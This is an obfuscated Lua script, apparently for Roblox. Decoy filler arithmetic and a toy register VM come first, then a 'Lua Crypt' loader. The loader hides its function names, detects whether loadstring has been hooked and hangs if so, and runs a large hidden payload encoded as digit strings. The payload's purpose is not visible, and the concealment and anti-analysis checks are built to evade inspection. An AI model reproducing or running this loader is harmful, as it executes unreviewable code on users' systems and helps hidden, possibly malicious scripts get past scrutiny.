local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local fIxz__z_ = {eee_____ = {v__l__xI = table.concat},n__vv___ = {_l_fpxz_ = loadstring},In______ = {f_l_v___ = tonumber},v_f_lv__ = {nl_x_ql_ = string.char},____Iv_f = { _qx_v_q_ = setmetatable}, ___x____ = { n______n = nil} } local _x__x__l = fIxz__z_.eee_____.v__l__xI local vvI_f_vl = fIxz__z_.n__vv___._l_fpxz_ local _v_IIIzf = fIxz__z_.In______.f_l_v___ local _I__q___ = fIxz__z_.v_f_lv__.nl_x_ql_ local _x_qn__x = fIxz__z_.____Iv_f._qx_v_q_ local _p__z_vx = fIxz__z_.___x____.n______n local I_v___qv = _I__q___(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function __xzf_nI(I_e__x_n) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local x___qq__ = I_e__x_n local _zvx_ql_ = setclipboard local _pq__I__ = toclipboard local function _fznx_zI(____f_I_) return function() return ____f_I_ end end local _v_f___q = warn local function _f_x___x(_fpfxx_e) return _fznx_zI(_fpfxx_e)() end local _____nln = error local function _____x_z() while true do end end local elxp__lp = print local function qpf_vpIq() return _f_x___x(math.random(100, 999)) end local _____v_f = game local ___en__v = {vvI_f_vl,_____v_f,elxp__lp,_v_f___q,_____nln,_zvx_ql_,_pq__I__} if ___en__v[1] == ___en__v[3] or ___en__v[1] == ___en__v[4] or ___en__v[1] == ___en__v[5] or ___en__v[1] == ___en__v[6] or ___en__v[1] == ___en__v[7] then _____x_z() end local function _qvx_qz_(____qzx_) local function q_q_z_x_(x__nxx_e) return _I__q___(_v_IIIzf(x__nxx_e, 2)) end qpf_vpIq() local _eIz_vlf = ____qzx_:gsub("[^01]", "") return _eIz_vlf:gsub("(".. ("[01]"):rep(8) .. ")", q_q_z_x_) end local _______z = _qvx_qz_(x___qq__) local sporty = game:GetService("Workspace") local function __vq__nq(___x_Ife) local ___z_nq_, ___lnp__, ___I_x_I, __xf____ = "l", "o", "a", "d" local _Ixxf__q, fpql_q_I, f_fq_Ipl, __z___ef = "s", "t", "r", "i" local _x____f_, ___x__ef = "n", "g" local function __l_f___(...) local nee_xl__, __x_l__n = {...}, "" for i = 1, #nee_xl__ do __x_l__n = __x_l__n .. nee_xl__[i] end return __x_l__n end local _qq___l_ = __l_f___(___z_nq_, ___lnp__, ___I_x_I, __xf____, _Ixxf__q, fpql_q_I, f_fq_Ipl, __z___ef, _x____f_, ___x__ef) local x___f__x = ("%s"):format(_qq___l_) local _l__x_x_, _z__lxpI = pcall(vvI_f_vl(___x_Ife)) local __xeI_n_, vq__ll__, nne__n_x = "________F__VDS__DFSRV_S_Z_S__S_WS_____FGRV____SGV_", "__F_X___V_D_QG_RX____VV__DQGFFRS____FXD__F__WXW___", "__G_GV__W_Z__FG_F___XGQ__D_XQG_Z_SSZ___S___S_Q__ZF" local __elzp_I = (2 * 5 / 10 + 3 - 3) ^ 1 if not _l__x_x_ then local lqn____n = { __xeI_n_, vq__ll__, nne__n_x, __elzp_I } for i = 1, # lqn____n do lqn____n[i] = lqn____n[i] .. "_extra" end end return _z__lxpI end __vq__nq(_______z, fIxz__z_.___x____.n______n); qpf_vpIq() local z_v_Ixnf = _x_qn__x( { pnn_____ = { x_l___lp = { _pfI_exp, vIf__n__, _l__ee_q }, Iev____I = function() for __n___I_ = 1, 50 do local _v_Ixn_z = __n___I_ * 2 local v_fI_zev = {__n___I_, __n___I_ * 10, __n___I_ * 100} end return fIxz__z_.___x____.n______n end }, _ep____z = { [true] = { function() for lp_q__v_ = 1, 100 do local _n_vfvx_ = lp_q__v_ * lp_q__v_ if _n_vfvx_ > 100 then break end end end }, [false] = { { function() return false end }, function() for _e_v__q_ = 1, 10 do local fx____xp = _e_v__q_ * 2 end end } } }, { __index = function(_, el______) local qp__Ief_ = "Lua Crypt1" if el______ == "print" then for ______f_ = 1, 100 do local l_zpp__n = ______f_ * ______f_ + ______f_ end return print elseif el______ == "warn" then for ffI_I_If = 1, 50 do local _vxepn__ = ffI_I_If * 3 if _vxepn__ == 150 then return warn end end end return fIxz__z_.___x____.n______n end } ) end __xzf_nI(_x__x__l({'064746162459169297055366164423147972073965054665','046354159274127655059749154947164533199462129524','077255144957123953055642029295046969057754137994','074344123666136359099475096925149274079532064439','059562133797124347139424062694067353137953126375','075524199224159457126696044443152762043365037945','073993177499133434195443034564065269166723063724','076363165965164539094542179642072532076993142375','072367169655172246063977194665152626136232056595','059794192694147929069695096374136996164655144425','065579094745164666045244173267053925099454064276','092374154446157694054749066695192454142594174567','035579152233146254076242072535052535022769165729','099462164773127953042663147454167564063464159655','056424127327145732057363042977167624064797176232','027563032343142272137964199644072499175653072744','037632143262062743044767133756053495039377045799','079936125335129424176444064325164599062255052563','074557155967122449123239059363133553097726022663','034697136663144423199545067639046297095963026622','097375144252034767072777022767137436164377122255','035746199292172566049479097999125355046425125477','023755194396146794157652025437127736037423063666','027267062559164426046247162563034396037655029374','095292063275144634099679096444146979134476169444','026765157693124993044336157693046574092952024642','032292153452195457157422034655165562063625093992','065426135666155797164624093366166534025527095399','033492125329176672196233056543046766072949072979','077639129493127734172563097446042762126949163733','069532096563179765136297166773077747135493027643','035595062329129962034446125435197975146753196756','059279037379157745069295153732153497137522153357','033992147394137352167376047935024274073445067933','054696136222195935035265043793049293094594125274','039575153392124336127354046772027494127442193564','029666166795135497153626093635153679063734054934','097656172527134579056974037524163559044654124726','029643125927192273092225069647069957192732079272','069374133696132672037575176674099697099947176966','063425125335167253029979174646152339127353074525','026636072973199695063732136677163766192666062932','076675154554167544065374055326024335143952166224','077425164529162365079562194697122769177623144579','046525174299167793062336144492134736075969193764','063335049535197774093752144342197425195452124354','022942163775126247143677095924052563192676072432','073276122334162347093445067266072247043757162942','044595134672196935197747027652173274164625153494','053462063254179557036927167794144924146435132353','095699076734196432132424032969042974039956032657','059726172257039274045254179393027796127759157497','076994079393147569152624094765164335196766127395','077234092292163449139922047967059934076653045697','065979134623173947043752192465054337026666076397','099276127674175669167597032679154694029747132926','063592027466177594137556063359164954077426065232','092566126474162536169397055695162499023964095622','076753042694159225055267075923162233143473167729','065649062549137249047294195654096794055922164692','036293064765165395036562142933024226065452144359','057344095742126277042347132664092539025425025777','033437043373195342039557199229072639034775176799'}))
